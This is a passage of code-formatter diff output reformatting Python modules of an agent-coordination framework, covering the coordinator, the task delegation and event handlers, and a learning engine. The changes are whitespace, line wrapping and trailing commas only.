             agent_info: Information about the agent with updated status
         """
         await self.publisher.publish_notification(
             notification_name="agent_status_updated",
             data={
                 "agent_id": agent_info.agent_id,
                 "status": agent_info.status.value,
-                "last_seen": agent_info.last_seen.isoformat() if agent_info.last_seen else None
-            }
+                "last_seen": (
+                    agent_info.last_seen.isoformat() if agent_info.last_seen else None
+                ),
+            },
         )
-    
+
     async def _publish_agent_capability_event(self, agent_info: AgentInfo) -> None:
         """
         Publish an agent capability update event.
-        
+
         Args:
             agent_info: Information about the agent with updated capabilities
         """
         await self.publisher.publish_notification(
             notification_name="agent_capabilities_updated",
             data={
                 "agent_id": agent_info.agent_id,
-                "capabilities": [cap.to_dict() for cap in agent_info.capabilities]
-            }
+                "capabilities": [cap.to_dict() for cap in agent_info.capabilities],
+            },
         )
-    
+
     async def _publish_task_assignment_event(self, task: Dict[str, Any]) -> None:
         """
         Publish a task assignment event.
-        
+
         Args:
             task: Information about the assigned task
         """
         await self.publisher.publish_command(
             command_name="execute_task",
             parameters={
                 "task_id": task["task_id"],
                 "task_type": task["task_type"],
                 "parameters": task["parameters"],
                 "priority": task["priority"],
-                "deadline": task["deadline"].isoformat() if task["deadline"] else None
+                "deadline": task["deadline"].isoformat() if task["deadline"] else None,
             },
-            target=task["agent_id"]
+            target=task["agent_id"],
         )
-    
+
     async def _publish_task_cancellation_event(self, task: Dict[str, Any]) -> None:
         """
         Publish a task cancellation event.
-        
+
         Args:
             task: Information about the cancelled task
         """
         await self.publisher.publish_command(
             command_name="cancel_task",
-            parameters={
-                "task_id": task["task_id"]
-            },
-            target=task["agent_id"]
+            parameters={"task_id": task["task_id"]},
+            target=task["agent_id"],
         )
-    
-    async def _publish_conflict_resolution_event(self, conflict: Dict[str, Any]) -> None:
+
+    async def _publish_conflict_resolution_event(
+        self, conflict: Dict[str, Any]
+    ) -> None:
         """
         Publish a conflict resolution event.
-        
+
         Args:
             conflict: Information about the resolved conflict
         """
         await self.publisher.publish_notification(
             notification_name="conflict_resolved",
             data={
                 "conflict_id": conflict["conflict_id"],
                 "resolution_strategy": conflict["resolution_strategy"],
-                "resolved_at": conflict["resolved_at"].isoformat()
-            }
+                "resolved_at": conflict["resolved_at"].isoformat(),
+            },
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/base_coordinator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/in_memory_coordinator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/in_memory_coordinator.py	2025-06-19 04:03:50.599291+00:00
@@ -12,622 +12,646 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, Coordinator, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    Coordinator,
+    CoordinationError,
 )
-from fs_agt_clean.core.coordination.coordinator.agent_registry import (
-    AgentRegistry
-)
+from fs_agt_clean.core.coordination.coordinator.agent_registry import AgentRegistry
 from fs_agt_clean.core.coordination.coordinator.task_delegator import (
-    Task, TaskStatus, TaskPriority, TaskDelegator
+    Task,
+    TaskStatus,
+    TaskPriority,
+    TaskDelegator,
 )
 from fs_agt_clean.core.coordination.coordinator.result_aggregator import (
-    AggregationStrategy, ResultAggregator
+    AggregationStrategy,
+    ResultAggregator,
 )
 from fs_agt_clean.core.coordination.coordinator.conflict_resolver import (
-    Conflict, ConflictType, ConflictStatus, ResolutionStrategy, ConflictResolver
+    Conflict,
+    ConflictType,
+    ConflictStatus,
+    ResolutionStrategy,
+    ConflictResolver,
 )
 
 
 class InMemoryCoordinator(Coordinator):
     """
     In-memory implementation of the Coordinator interface.
-    
+
     This class provides a complete coordination solution using in-memory
     implementations of the AgentRegistry, TaskDelegator, ResultAggregator,
     and ConflictResolver components.
     """
-    
+
     def __init__(self, coordinator_id: str):
         """
         Initialize the in-memory coordinator.
-        
+
         Args:
             coordinator_id: Unique identifier for this coordinator
         """
         self.coordinator_id = coordinator_id
         self.logger = get_logger(f"coordinator.{coordinator_id}")
-        
+
         # Create publisher and subscriber for event-based communication
         self.publisher = create_publisher(source_id=f"coordinator.{coordinator_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.{coordinator_id}")
-        
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.{coordinator_id}"
+        )
+
         # Create component instances
         self.agent_registry = AgentRegistry(registry_id=f"{coordinator_id}.registry")
         self.task_delegator = TaskDelegator(delegator_id=f"{coordinator_id}.delegator")
-        self.result_aggregator = ResultAggregator(aggregator_id=f"{coordinator_id}.aggregator")
-        self.conflict_resolver = ConflictResolver(resolver_id=f"{coordinator_id}.resolver")
-        
+        self.result_aggregator = ResultAggregator(
+            aggregator_id=f"{coordinator_id}.aggregator"
+        )
+        self.conflict_resolver = ConflictResolver(
+            resolver_id=f"{coordinator_id}.resolver"
+        )
+
         # Initialize subscription IDs
         self.subscription_ids: List[str] = []
-    
+
     async def start(self) -> None:
         """
         Start the coordinator and all its components.
         """
         # Start components
         await self.agent_registry.start()
         await self.task_delegator.start()
         await self.result_aggregator.start()
         await self.conflict_resolver.start()
-        
+
         # Subscribe to events
         await self._subscribe_to_events()
-        
+
         self.logger.info(f"Coordinator started: {self.coordinator_id}")
-    
+
     async def stop(self) -> None:
         """
         Stop the coordinator and all its components.
         """
         # Stop components
         await self.agent_registry.stop()
         await self.task_delegator.stop()
         await self.result_aggregator.stop()
         await self.conflict_resolver.stop()
-        
+
         # Unsubscribe from events
         for subscription_id in self.subscription_ids:
             await self.subscriber.unsubscribe(subscription_id)
-        
+
         self.subscription_ids = []
-        
+
         self.logger.info(f"Coordinator stopped: {self.coordinator_id}")
-    
+
     async def register_agent(self, agent_info: AgentInfo) -> bool:
         """
         Register an agent with the coordinator.
-        
+
         Args:
             agent_info: Information about the agent
-            
+
         Returns:
             True if registration was successful
-            
+
         Raises:
             CoordinationError: If registration fails
         """
         return await self.agent_registry.register_agent(agent_info)
-    
+
     async def unregister_agent(self, agent_id: str) -> bool:
         """
         Unregister an agent from the coordinator.
-        
+
         Args:
             agent_id: ID of the agent to unregister
-            
+
         Returns:
             True if unregistration was successful
-            
+
         Raises:
             CoordinationError: If unregistration fails
         """
         return await self.agent_registry.unregister_agent(agent_id)
-    
+
     async def update_agent_status(self, agent_id: str, status: AgentStatus) -> bool:
         """
         Update an agent's status.
-        
+
         Args:
             agent_id: ID of the agent
             status: New status of the agent
-            
+
         Returns:
             True if the update was successful
-            
+
         Raises:
             CoordinationError: If the update fails
         """
         return await self.agent_registry.update_agent_status(agent_id, status)
-    
+
     async def update_agent_capabilities(
-        self,
-        agent_id: str,
-        capabilities: List[AgentCapability]
+        self, agent_id: str, capabilities: List[AgentCapability]
     ) -> bool:
         """
         Update an agent's capabilities.
-        
+
         Args:
             agent_id: ID of the agent
             capabilities: New capabilities of the agent
-            
+
         Returns:
             True if the update was successful
-            
+
         Raises:
             CoordinationError: If the update fails
         """
-        return await self.agent_registry.update_agent_capabilities(agent_id, capabilities)
-    
+        return await self.agent_registry.update_agent_capabilities(
+            agent_id, capabilities
+        )
+
     async def get_agent_info(self, agent_id: str) -> Optional[AgentInfo]:
         """
         Get information about an agent.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             Agent information, or None if not found
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         return await self.agent_registry.get_agent_info(agent_id)
-    
+
     async def find_agents_by_type(self, agent_type: AgentType) -> List[AgentInfo]:
         """
         Find agents by type.
-        
+
         Args:
             agent_type: Type of agents to find
-            
+
         Returns:
             List of matching agents
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         return await self.agent_registry.find_agents_by_type(agent_type)
-    
-    async def find_agents_by_capability(self, capability: AgentCapability) -> List[AgentInfo]:
+
+    async def find_agents_by_capability(
+        self, capability: AgentCapability
+    ) -> List[AgentInfo]:
         """
         Find agents by capability.
-        
+
         Args:
             capability: Capability to search for
-            
+
         Returns:
             List of agents with the capability
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         return await self.agent_registry.find_agents_by_capability(capability)
-    
+
     async def find_agents_by_status(self, status: AgentStatus) -> List[AgentInfo]:
         """
         Find agents by status.
-        
+
         Args:
             status: Status to search for
-            
+
         Returns:
             List of agents with the status
-            
+
         Raises:
             CoordinationError: If the search fails
         """
         return await self.agent_registry.find_agents_by_status(status)
-    
+
     async def get_all_agents(self) -> List[AgentInfo]:
         """
         Get all registered agents.
-        
+
         Returns:
             List of all agents
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         return await self.agent_registry.get_all_agents()
-    
+
     async def check_agent_health(self, agent_id: str) -> bool:
         """
         Check if an agent is healthy.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             True if the agent is healthy
-            
+
         Raises:
             CoordinationError: If the health check fails
         """
         return await self.agent_registry.check_agent_health(agent_id)
-    
+
     async def delegate_task(
         self,
         task_id: str,
         task_type: str,
         parameters: Dict[str, Any],
         target_agent_id: Optional[str] = None,
         required_capability: Optional[AgentCapability] = None,
         priority: int = 0,
-        deadline: Optional[datetime] = None
+        deadline: Optional[datetime] = None,
     ) -> str:
         """
         Delegate a task to an agent.
-        
+
         Args:
             task_id: ID of the task
             task_type: Type of the task
             parameters: Task parameters
             target_agent_id: ID of the target agent, or None to auto-select
             required_capability: Required capability for the task
             priority: Priority of the task (higher values = higher priority)
             deadline: Deadline for task completion
-            
+
         Returns:
             ID of the assigned task
-            
+
         Raises:
             CoordinationError: If delegation fails
         """
         try:
             # If no task_id is provided, generate one
             if not task_id:
                 task_id = str(uuid.uuid4())
-            
+
             # If a target agent is specified, verify it exists and is healthy
             if target_agent_id:
                 agent_info = await self.get_agent_info(target_agent_id)
                 if not agent_info:
                     raise CoordinationError(
-                        f"Target agent not found: {target_agent_id}",
-                        task_id=task_id
+                        f"Target agent not found: {target_agent_id}", task_id=task_id
                     )
-                
+
                 if not await self.check_agent_health(target_agent_id):
                     raise CoordinationError(
                         f"Target agent is not healthy: {target_agent_id}",
-                        task_id=task_id
+                        task_id=task_id,
                     )
-                
+
                 # If a capability is required, verify the agent has it
-                if required_capability and not agent_info.has_capability(required_capability):
+                if required_capability and not agent_info.has_capability(
+                    required_capability
+                ):
                     raise CoordinationError(
                         f"Target agent does not have required capability: {required_capability.name}",
                         agent_id=target_agent_id,
-                        task_id=task_id
+                        task_id=task_id,
                     )
-            
+
             # If no target agent is specified but a capability is required,
             # find a suitable agent
             elif required_capability:
                 agents = await self.find_agents_by_capability(required_capability)
                 healthy_agents = [
-                    agent for agent in agents
+                    agent
+                    for agent in agents
                     if await self.check_agent_health(agent.agent_id)
                 ]
-                
+
                 if not healthy_agents:
                     raise CoordinationError(
                         f"No healthy agents found with required capability: {required_capability.name}",
-                        task_id=task_id
+                        task_id=task_id,
                     )
-                
+
                 # Select the agent with the fewest tasks
                 # This is a simple load balancing strategy
                 target_agent_id = await self._select_agent_for_task(healthy_agents)
-            
+
             else:
                 raise CoordinationError(
                     "Either target_agent_id or required_capability must be specified",
-                    task_id=task_id
+                    task_id=task_id,
                 )
-            
+
             # Create the task
-            task_priority = TaskPriority(priority) if isinstance(priority, int) else priority
+            task_priority = (
+                TaskPriority(priority) if isinstance(priority, int) else priority
+            )
             created_task_id = await self.task_delegator.create_task(
                 task_type=task_type,
                 parameters=parameters,
                 agent_id=target_agent_id,
                 priority=task_priority,
-                deadline=deadline
-            )
-            
+                deadline=deadline,
+            )
+
             # Assign the task to the agent
             await self.task_delegator.assign_task(created_task_id, target_agent_id)
-            
+
             # Register the task for result aggregation
             await self.result_aggregator.register_task(
-                task_id=created_task_id,
-                strategy=AggregationStrategy.COLLECT
-            )
-            
+                task_id=created_task_id, strategy=AggregationStrategy.COLLECT
+            )
+
             self.logger.info(
                 f"Task delegated: {created_task_id} ({task_type}) to agent {target_agent_id}"
             )
-            
+
             return created_task_id
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to delegate task {task_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, task_id=task_id, cause=e)
-    
+
     async def get_task_status(self, task_id: str) -> Dict[str, Any]:
         """
         Get the status of a task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             Task status information
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         task = await self.task_delegator.get_task(task_id)
         if not task:
-            raise CoordinationError(
-                f"Task not found: {task_id}",
-                task_id=task_id
-            )
-        
+            raise CoordinationError(f"Task not found: {task_id}", task_id=task_id)
+
         return {
             "task_id": task.task_id,
             "task_type": task.task_type,
             "agent_id": task.agent_id,
             "status": task.status.value,
             "created_at": task.created_at,
             "deadline": task.deadline,
-            "priority": task.priority.value
+            "priority": task.priority.value,
         }
-    
+
     async def cancel_task(self, task_id: str) -> bool:
         """
         Cancel a task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             True if cancellation was successful
-            
+
         Raises:
             CoordinationError: If cancellation fails
         """
         return await self.task_delegator.cancel_task(task_id)
-    
+
     async def get_task_result(self, task_id: str) -> Dict[str, Any]:
         """
         Get the result of a completed task.
-        
+
         Args:
             task_id: ID of the task
-            
+
         Returns:
             Task result
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         # Get the task
         task = await self.task_delegator.get_task(task_id)
         if not task:
-            raise CoordinationError(
-                f"Task not found: {task_id}",
-                task_id=task_id
-            )
-        
+            raise CoordinationError(f"Task not found: {task_id}", task_id=task_id)
+
         if task.status != TaskStatus.COMPLETED:
             raise CoordinationError(
                 f"Task not completed: {task_id} (status: {task.status.value})",
-                task_id=task_id
-            )
-        
+                task_id=task_id,
+            )
+
         # Get the aggregated result
         result = await self.result_aggregator.aggregate_results(task_id)
-        
+
         return {
             "task_id": task.task_id,
             "task_type": task.task_type,
             "agent_id": task.agent_id,
             "result": result,
-            "completed_at": task.completed_at
+            "completed_at": task.completed_at,
         }
-    
+
     async def get_agent_tasks(self, agent_id: str) -> List[Dict[str, Any]]:
         """
         Get tasks assigned to an agent.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             List of tasks assigned to the agent
-            
+
         Raises:
             CoordinationError: If the retrieval fails
         """
         tasks = await self.task_delegator.get_agent_tasks(agent_id)
-        
+
         return [
             {
                 "task_id": task.task_id,
                 "task_type": task.task_type,
                 "status": task.status.value,
                 "created_at": task.created_at,
                 "deadline": task.deadline,
-                "priority": task.priority.value
+                "priority": task.priority.value,
             }
             for task in tasks
         ]
-    
+
     async def resolve_conflict(
         self,
         conflict_id: str,
         resolution_strategy: str,
-        resolution_parameters: Dict[str, Any]
+        resolution_parameters: Dict[str, Any],
     ) -> bool:
         """
         Resolve a conflict between agents or tasks.
-        
+
         Args:
             conflict_id: ID of the conflict
             resolution_strategy: Strategy to use for resolution
             resolution_parameters: Parameters for the resolution strategy
-            
+
         Returns:
             True if resolution was successful
-            
+
         Raises:
             CoordinationError: If resolution fails
         """
         try:
             # Convert strategy string to enum
             try:
                 strategy = ResolutionStrategy(resolution_strategy)
             except ValueError:
                 raise CoordinationError(
                     f"Invalid resolution strategy: {resolution_strategy}",
-                    cause=ValueError(f"Invalid strategy: {resolution_strategy}")
+                    cause=ValueError(f"Invalid strategy: {resolution_strategy}"),
                 )
-            
+
             # Resolve the conflict
             return await self.conflict_resolver.resolve_conflict(
                 conflict_id=conflict_id,
                 strategy=strategy,
-                resolution_params=resolution_parameters
+                resolution_params=resolution_parameters,
             )
         except CoordinationError:
             # Re-raise coordination errors
             raise
         except Exception as e:
             error_msg = f"Failed to resolve conflict {conflict_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
-    
+
     async def _select_agent_for_task(self, agents: List[AgentInfo]) -> str:
         """
         Select an agent for a task from a list of candidates.
-        
+
         This implementation uses a simple load balancing strategy.
-        
+
         Args:
             agents: List of candidate agents
-            
+
         Returns:
             ID of the selected agent
         """
         # If there's only one agent, select it
         if len(agents) == 1:
             return agents[0].agent_id
-        
+
         # Get the number of tasks for each agent
         agent_task_counts = {}
         for agent in agents:
             tasks = await self.get_agent_tasks(agent.agent_id)
             active_tasks = [
-                task for task in tasks
-                if task["status"] in ("assigned", "processing")
+                task for task in tasks if task["status"] in ("assigned", "processing")
             ]
             agent_task_counts[agent.agent_id] = len(active_tasks)
-        
+
         # Select the agent with the fewest active tasks
         return min(agent_task_counts.items(), key=lambda x: x[1])[0]
-    
+
     async def _subscribe_to_events(self) -> None:
         """
         Subscribe to coordination-related events.
-        
+
         This method sets up subscriptions for agent registration,
         task delegation, and other coordination-related events.
         """
         # Subscribe to agent registration events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"agent_registration_request"}),
-            handler=self._handle_agent_registration_request
+            handler=self._handle_agent_registration_request,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Subscribe to task delegation events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"task_delegation_request"}),
-            handler=self._handle_task_delegation_request
+            handler=self._handle_task_delegation_request,
         )
         self.subscription_ids.append(subscription_id)
-        
+
         # Subscribe to conflict detection events
         subscription_id = await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"conflict_detection_request"}),
-            handler=self._handle_conflict_detection_request
+            handler=self._handle_conflict_detection_request,
         )
         self.subscription_ids.append(subscription_id)
-    
+
     async def _handle_agent_registration_request(self, event: Event) -> None:
         """
         Handle an agent registration request event.
-        
+
         Args:
             event: The registration request event
         """
         try:
             # Extract agent information from the event
             agent_id = event.data.get("agent_id")
             agent_type_str = event.data.get("agent_type")
             name = event.data.get("name")
             description = event.data.get("description")
             capabilities_data = event.data.get("capabilities", [])
-            
+
             if not agent_id or not agent_type_str or not name:
-                self.logger.warning("Received agent registration request with missing data")
+                self.logger.warning(
+                    "Received agent registration request with missing data"
+                )
                 return
-            
+
             # Convert agent type string to enum
             try:
                 agent_type = AgentType(agent_type_str)
             except ValueError:
                 self.logger.warning(f"Received invalid agent type: {agent_type_str}")
                 return
-            
+
             # Convert capability data to objects
             capabilities = [
-                AgentCapability.from_dict(cap_data)
-                for cap_data in capabilities_data
+                AgentCapability.from_dict(cap_data) for cap_data in capabilities_data
             ]
-            
+
             # Create agent info
             agent_info = AgentInfo(
                 agent_id=agent_id,
                 agent_type=agent_type,
                 name=name,
                 description=description or "",
-                capabilities=capabilities
-            )
-            
+                capabilities=capabilities,
+            )
+
             # Register the agent
             await self.register_agent(agent_info)
         except Exception as e:
-            self.logger.error(f"Error handling agent registration request: {str(e)}", exc_info=True)
-    
+            self.logger.error(
+                f"Error handling agent registration request: {str(e)}", exc_info=True
+            )
+
     async def _handle_task_delegation_request(self, event: Event) -> None:
         """
         Handle a task delegation request event.
-        
+
         Args:
             event: The delegation request event
         """
         try:
             # Extract task information from the event
@@ -636,73 +660,85 @@
             parameters = event.data.get("parameters", {})
             target_agent_id = event.data.get("target_agent_id")
             required_capability_data = event.data.get("required_capability")
             priority = event.data.get("priority", 0)
             deadline_str = event.data.get("deadline")
-            
+
             if not task_type:
-                self.logger.warning("Received task delegation request without task_type")
+                self.logger.warning(
+                    "Received task delegation request without task_type"
+                )
                 return
-            
+
             # Convert deadline string to datetime if provided
             deadline = None
             if deadline_str:
                 try:
                     deadline = datetime.fromisoformat(deadline_str)
                 except ValueError:
                     self.logger.warning(f"Received invalid deadline: {deadline_str}")
-            
+
             # Convert required capability data to object if provided
             required_capability = None
             if required_capability_data:
                 try:
-                    required_capability = AgentCapability.from_dict(required_capability_data)
+                    required_capability = AgentCapability.from_dict(
+                        required_capability_data
+                    )
                 except Exception as e:
                     self.logger.warning(f"Received invalid capability data: {str(e)}")
-            
+
             # Delegate the task
             await self.delegate_task(
                 task_id=task_id or str(uuid.uuid4()),
                 task_type=task_type,
                 parameters=parameters,
                 target_agent_id=target_agent_id,
                 required_capability=required_capability,
                 priority=priority,
-                deadline=deadline
+                deadline=deadline,
             )
         except Exception as e:
-            self.logger.error(f"Error handling task delegation request: {str(e)}", exc_info=True)
-    
+            self.logger.error(
+                f"Error handling task delegation request: {str(e)}", exc_info=True
+            )
+
     async def _handle_conflict_detection_request(self, event: Event) -> None:
         """
         Handle a conflict detection request event.
-        
+
         Args:
             event: The conflict detection request event
         """
         try:
             # Extract conflict information from the event
             conflict_type_str = event.data.get("conflict_type")
             entities = event.data.get("entities")
             description = event.data.get("description")
             metadata = event.data.get("metadata")
-            
+
             if not conflict_type_str or not entities or not description:
-                self.logger.warning("Received conflict detection request with missing data")
+                self.logger.warning(
+                    "Received conflict detection request with missing data"
+                )
                 return
-            
+
             # Convert conflict type string to enum
             try:
                 conflict_type = ConflictType(conflict_type_str)
             except ValueError:
-                self.logger.warning(f"Received invalid conflict type: {conflict_type_str}")
+                self.logger.warning(
+                    f"Received invalid conflict type: {conflict_type_str}"
+                )
                 return
-            
+
             # Detect the conflict
             await self.conflict_resolver.detect_conflict(
                 conflict_type=conflict_type,
                 entities=entities,
                 description=description,
-                metadata=metadata
+                metadata=metadata,
             )
         except Exception as e:
-            self.logger.error(f"Error handling conflict detection request: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling conflict detection request: {str(e)}", exc_info=True
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/in_memory_coordinator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/learning_engine.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/learning_engine.py	2025-06-19 04:03:50.685659+00:00
@@ -18,18 +18,21 @@
 import json
 import logging
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
-from fs_agt_clean.core.coordination.decision.interfaces import (
-    LearningEngine
-)
+from fs_agt_clean.core.coordination.decision.interfaces import LearningEngine
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
 )
 from fs_agt_clean.core.coordination.event_system import (
-    EventPublisher, NotificationEvent
+    EventPublisher,
+    NotificationEvent,
 )
 
 
 logger = logging.getLogger(__name__)
 
@@ -69,18 +72,18 @@
             "feedback_count": 0,
             "learning_iterations": 0,
             "confidence_adjustments": {},
             "decision_type_weights": {},
             "last_learning_time": None,
-            "battery_efficient_learning": False
+            "battery_efficient_learning": False,
         }
 
     async def learn_from_feedback(
         self,
         feedback_data: Dict[str, Any],
         publish_event: bool = False,
-        battery_efficient: bool = False
+        battery_efficient: bool = False,
     ) -> bool:
         """Learn from feedback on decision outcomes.
 
         Args:
             feedback_data: Feedback data
@@ -113,11 +116,13 @@
 
         # Update confidence adjustments for this decision type
         if decision_type not in self.learning_data["confidence_adjustments"]:
             self.learning_data["confidence_adjustments"][decision_type] = 0
 
-        self.learning_data["confidence_adjustments"][decision_type] += confidence_adjustment
+        self.learning_data["confidence_adjustments"][
+            decision_type
+        ] += confidence_adjustment
 
         # Update decision type weights
         if decision_type not in self.learning_data["decision_type_weights"]:
             self.learning_data["decision_type_weights"][decision_type] = 1.0
 
@@ -140,12 +145,12 @@
                         "decision_type": decision_type,
                         "confidence_adjustment": confidence_adjustment,
                         "quality": quality,
                         "relevance": relevance,
                         "timestamp": datetime.now().isoformat(),
-                        "battery_efficient": battery_efficient
-                    }
+                        "battery_efficient": battery_efficient,
+                    },
                 )
                 logger.debug("Published learning_completed event")
             except Exception as e:
                 logger.error(f"Error publishing learning_completed event: {e}")
 
@@ -176,32 +181,27 @@
             "feedback_count": 0,
             "learning_iterations": 0,
             "confidence_adjustments": {},
             "decision_type_weights": {},
             "last_learning_time": None,
-            "battery_efficient_learning": False
+            "battery_efficient_learning": False,
         }
 
         # Publish event if requested
         if publish_event:
             try:
                 await self.publisher.publish_notification(
                     notification_name="learning_reset",
-                    data={
-                        "timestamp": datetime.now().isoformat()
-                    }
+                    data={"timestamp": datetime.now().isoformat()},
                 )
                 logger.debug("Published learning_reset event")
             except Exception as e:
                 logger.error(f"Error publishing learning_reset event: {e}")
 
         return True
 
-    async def get_confidence_adjustment(
-        self,
-        decision_type: DecisionType
-    ) -> float:
+    async def get_confidence_adjustment(self, decision_type: DecisionType) -> float:
         """Get confidence adjustment for a decision type.
 
         Args:
             decision_type: Type of decision
 
@@ -214,11 +214,11 @@
     def _calculate_confidence_adjustment(
         self,
         actual_outcome: str,
         quality: float,
         relevance: float,
-        battery_efficient: bool
+        battery_efficient: bool,
     ) -> float:
         """Calculate confidence adjustment based on outcome and quality.
 
         Args:
             actual_outcome: Actual outcome of the decision
@@ -246,9 +246,11 @@
         # Otherwise, adjust based on quality and relevance
         quality_factor = quality - 0.5  # -0.5 to 0.5
         relevance_factor = relevance - 0.5  # -0.5 to 0.5
 
         # Combine factors
-        adjustment = base_adjustment + (quality_factor * 0.02) + (relevance_factor * 0.01)
+        adjustment = (
+            base_adjustment + (quality_factor * 0.02) + (relevance_factor * 0.01)
+        )
 
         # Limit adjustment range
         return max(-0.1, min(0.1, adjustment))
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/learning_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/__init__.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/__init__.py	2025-06-19 04:03:50.722692+00:00
@@ -18,42 +18,65 @@
 - Scalable: Capable of handling high volumes of events
 """
 
 # Re-export core components
 from fs_agt_clean.core.coordination.event_system.event import (
-    Event, EventType, EventPriority, EventStatus,
-    CommandEvent, NotificationEvent, QueryEvent, ResponseEvent, ErrorEvent,
-    create_event_from_dict, create_event_from_json
+    Event,
+    EventType,
+    EventPriority,
+    EventStatus,
+    CommandEvent,
+    NotificationEvent,
+    QueryEvent,
+    ResponseEvent,
+    ErrorEvent,
+    create_event_from_dict,
+    create_event_from_json,
 )
 
 from fs_agt_clean.core.coordination.event_system.event_bus import (
-    EventBus, BaseEventBus, EventBusError
+    EventBus,
+    BaseEventBus,
+    EventBusError,
 )
 
 from fs_agt_clean.core.coordination.event_system.in_memory_event_bus import (
-    InMemoryEventBus
+    InMemoryEventBus,
 )
 
 from fs_agt_clean.core.coordination.event_system.publisher import (
-    EventPublisher, BaseEventPublisher, InMemoryEventPublisher, PublishError
+    EventPublisher,
+    BaseEventPublisher,
+    InMemoryEventPublisher,
+    PublishError,
 )
 
 from fs_agt_clean.core.coordination.event_system.subscriber import (
-    EventSubscriber, BaseEventSubscriber, InMemoryEventSubscriber, SubscriptionError,
-    Subscription, SubscriptionFilter, EventTypeFilter, EventNameFilter,
-    EventSourceFilter, EventTargetFilter, EventPriorityFilter,
-    EventNamePatternFilter, CompositeFilter, CustomFilter
+    EventSubscriber,
+    BaseEventSubscriber,
+    InMemoryEventSubscriber,
+    SubscriptionError,
+    Subscription,
+    SubscriptionFilter,
+    EventTypeFilter,
+    EventNameFilter,
+    EventSourceFilter,
+    EventTargetFilter,
+    EventPriorityFilter,
+    EventNamePatternFilter,
+    CompositeFilter,
+    CustomFilter,
 )
 
 # Singleton event bus instance
 _event_bus = None
 
 
 def get_event_bus() -> EventBus:
     """
     Get the singleton event bus instance.
-    
+
     Returns:
         The event bus instance
     """
     global _event_bus
     if _event_bus is None:
@@ -62,37 +85,37 @@
 
 
 def set_event_bus(event_bus: EventBus) -> None:
     """
     Set the singleton event bus instance.
-    
+
     Args:
         event_bus: The event bus instance to set
     """
     global _event_bus
     _event_bus = event_bus
 
 
 def create_publisher(source_id: str) -> EventPublisher:
     """
     Create an event publisher.
-    
+
     Args:
         source_id: ID of the event source (agent or component)
-        
+
     Returns:
         The event publisher
     """
     return InMemoryEventPublisher(source_id, get_event_bus())
 
 
 def create_subscriber(subscriber_id: str) -> EventSubscriber:
     """
     Create an event subscriber.
-    
+
     Args:
         subscriber_id: ID of the subscriber
-        
+
     Returns:
         The event subscriber
     """
     return InMemoryEventSubscriber(subscriber_id, get_event_bus())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/conflict_resolver.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/conflict_resolver.py	2025-06-19 04:03:50.838178+00:00
@@ -13,25 +13,38 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union, Callable
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    CoordinationError,
 )
